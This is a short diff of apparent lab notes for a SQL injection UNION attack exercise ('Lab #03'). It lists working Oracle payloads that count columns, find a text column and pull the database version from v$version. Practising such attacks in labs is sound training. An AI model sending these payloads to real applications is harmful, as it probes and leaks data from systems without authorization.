@@ -1,3 +1,15 @@
+Goal--> Finding the version of database
+Finding the number of columns
+' order by 2--
+
+' union select NULL,NULL FROM DUAL--
+
+Column containing the text
+' union select 'a','b' FROM DUAL--
+
+Finding the version of database
+' union select banner,NULL FROM v$version--
+
 Lab #03
 SQL injection UNION attack, determining the number of columns returned by the query
 Finding Number of column
